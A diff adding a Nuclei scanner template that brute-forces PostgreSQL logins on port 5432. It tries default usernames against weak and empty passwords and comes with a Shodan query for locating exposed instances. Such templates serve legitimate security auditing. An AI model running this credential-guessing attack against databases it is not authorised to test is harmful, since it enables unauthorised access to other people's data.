@@ -1,0 +1,47 @@
+id: postgres-pass-brute
+
+info:
+  name: PostgreSQL Password Bruteforce
+  author: pdteam
+  severity: high
+  description: |
+    This template bruteforces passwords for protected PostgreSQL instances.
+    If PostgreSQL is not protected with password, it is also matched.
+  metadata:
+    shodan-query: product:"PostgreSQL"
+  tags: js,network,postgresql,authentication
+
+javascript:
+  - pre-condition: |
+      isPortOpen(Host,Port)
+
+    code: |
+      const postgres = require('nuclei/postgres');
+      const client = new postgres.PGClient;
+      success = client.Connect(Host, Port, User, Pass);
+
+    args:
+      Host: "{{Host}}"
+      Port: "5432"
+      User: "{{usernames}}"
+      Pass: "{{passwords}}"
+
+    attack: clusterbomb
+    payloads:
+      usernames:
+        - postgres
+        - admin
+        - root
+      passwords:
+        - ""
+        - postgres
+        - password
+        - admin
+        - root
+    stop-at-first-match: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "success == true"
+
